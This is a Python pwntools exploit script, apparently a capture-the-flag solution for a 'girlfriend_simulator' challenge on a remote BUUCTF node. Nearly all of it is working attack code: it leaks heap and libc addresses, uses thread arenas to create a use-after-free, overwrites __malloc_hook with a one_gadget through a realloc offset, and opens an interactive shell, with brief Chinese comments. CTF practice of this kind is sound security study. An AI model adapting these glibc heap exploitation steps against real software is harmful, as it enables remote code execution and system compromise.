#coding:utf8
from pwn import *
 
#sh = process('./girlfriend_simulator')
sh = remote('node3.buuoj.cn',26411)
libc = ELF('./libc-2.23.so')
num = 9
sh.sendlineafter('How much girlfriend you want ?',str(num))
 
def add(size,content):
   sh.sendlineafter('>>','1')
   sh.sendlineafter('size?',str(size))
   sh.sendafter('content:',content)
 
def delete():
   sh.sendlineafter('>>','2')
 
def show():
   sh.sendlineafter('>>','3')
 
def nextThread():
   sh.sendlineafter('>>','5')
 
for i in range(num - 1):
   add(0x10,'a'*0x10)
   delete()
   add(0x10,'a'*0x8)
   show()
   sh.recvuntil('a'*0x8)
   heap_addr = u64(sh.recv(6).ljust(8,'\x00'))
   print 'heap_addr=',hex(heap_addr)
   nextThread()
#这个线程将使用主线程的main_arena，由此在主线程的堆里制造一个UAF
add(0x60,'a'*0x60)
delete()
nextThread()
 
sh.recvuntil('wife:0x')
libc_base = int(sh.recv(12),16) - libc.sym['_IO_2_1_stdout_']
malloc_hook_addr = libc_base + libc.sym['__malloc_hook']
one_gadget_addr = libc_base + 0x4526a
realloc_addr = libc_base + libc.sym['realloc']
print 'libc_base=',hex(libc_base)
print 'malloc_hook_addr=',hex(malloc_hook_addr)
print 'realloc_addr=',hex(realloc_addr)
print 'one_gadget_addr=',hex(one_gadget_addr)
sh.sendlineafter('say something to impress your girlfriend',p64(malloc_hook_addr - 0x23))
sh.sendlineafter('your girlfriend is moved by your words','I love you')
#改写malloc_hook
payload = '\x00'*0xB + p64(one_gadget_addr) + p64(realloc_addr + 0x2)
sh.sendlineafter('Questionnaire',payload)
 
sh.interactive()